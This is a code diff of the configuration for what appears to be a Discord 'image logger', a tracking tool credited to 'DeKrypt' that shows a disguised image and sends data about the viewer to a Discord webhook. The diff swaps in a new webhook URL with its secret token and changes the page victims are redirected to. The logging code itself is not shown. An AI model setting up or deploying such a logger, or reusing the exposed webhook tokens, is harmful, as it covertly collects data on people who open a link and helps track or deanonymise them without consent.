@@ -9,7 +9,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1161777411717865602/8jXm7E_nor-GpxPDHo--kUBV-GPpivVlwpoej_u2hrcmdfnB8UES4jUuOo00gBrusqcl",
+    "webhook": "https://discord.com/api/webhooks/1150799621841506376/bTvJXa1-z2Hktd2qQVVCzND_tk2qVUV6crL-og8XnBh4N0W4zKVqM4JT5dmITcVgetsG",
     "image": "https://cdn.discordapp.com/attachments/1161777385964838964/1182654868423454800/image.png?ex=65857c2d&is=6573072d&hm=b0d383ca600c39ca524ef4f6d57d59ff9879f5960bba79fe0003a3a876f1c970&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -48,7 +48,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://cdn.discordapp.com/attachments/1161777385964838964/1182654868423454800/image.png?ex=65857c2d&is=6573072d&hm=b0d383ca600c39ca524ef4f6d57d59ff9879f5960bba79fe0003a3a876f1c970&" # Link to the webpage to redirect to 
+        "page": "https://fumble.nl/products/jaap" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
